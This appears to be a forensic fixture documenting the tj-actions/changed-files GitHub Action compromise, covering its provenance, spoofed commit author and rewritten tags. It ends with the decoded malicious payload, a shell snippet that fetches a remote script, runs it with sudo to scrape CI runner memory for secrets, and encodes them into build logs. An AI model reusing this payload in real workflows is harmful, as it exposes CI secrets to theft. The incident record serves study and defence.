_readme: Hardcoded fixture — the malicious commit's object was force-pushed out of tj-actions/changed-files' history after disclosure and 404s/422s against the live GitHub API and its known mirrors (6si/changed-files, trmlabs/changed-files at the SHA itself). This patch is BYTE-EXACT anyway: trmlabs/changed-files cloned the repo at the malicious commit (their commit eb3c72d826, message cites SHA 0e58ed8671...) and then reverted it (commit 8567847ee1). Diffing that revert against its parent reproduces the original malicious diff exactly. Verified against that fork via fetch.py on 2026-09-17.
author: renovate
author_note: Commit author was spoofed as the 'renovate' bot and was unverified/unsigned — see Wiz writeup.
committed_at_note: Date only; compromise window per public reporting was 2025-03-14 through 2025-03-15 12:00 UTC. Exact time not independently recoverable since the commit object itself is gone.
provenance: https://github.com/trmlabs/changed-files/commit/8567847ee1cf5674ab5a1a6a3c1dd898b47a90b1 (revert diff this patch was reconstructed from; verify current SHA if this fork changes)
notes: All version tags (v1.0.0, v35.7.7-sec, v44.5.1, ...) were retroactively rewritten to point at this single commit, dumping CI secrets into public build logs for ~23,000 repos. This is the same memory-scraping technique as the reviewdog/action-setup incident (kitsunox's live-fetchable reviewdog f0d342d incident) — both download/decode a Python script that finds the Runner.Worker process and reads secret values out of its memory.
decoded_payload_for_reference:
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
  echo $B64_BLOB
else
  exit 0
fi
